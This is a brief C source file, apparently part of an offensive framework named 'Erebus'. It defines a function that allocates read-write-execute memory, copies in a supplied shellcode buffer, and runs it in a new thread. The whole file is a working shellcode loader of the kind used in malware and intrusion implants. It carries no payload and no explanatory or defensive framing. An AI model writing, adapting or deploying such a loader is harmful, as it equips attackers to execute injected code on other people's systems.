#define _GNU_SOURCE
#include <string.h>
#include <pthread.h>
#include <sys/mman.h>
#include "../../include/injection.h"

static void *_run(void *arg)
{
    void (*fn)(void) = (void (*)(void))arg;
    fn();
    return NULL;
}

void erebus_mmap_thread(const unsigned char *sc, size_t sc_len)
{
    void *mem = mmap(NULL, sc_len,
                     PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return;

    memcpy(mem, sc, sc_len);
    __builtin___clear_cache((char *)mem, (char *)mem + sc_len);

    pthread_t tid;
    if (pthread_create(&tid, NULL, _run, mem) != 0) {
        munmap(mem, sc_len);
        return;
    }
    pthread_join(tid, NULL);
    munmap(mem, sc_len);
}
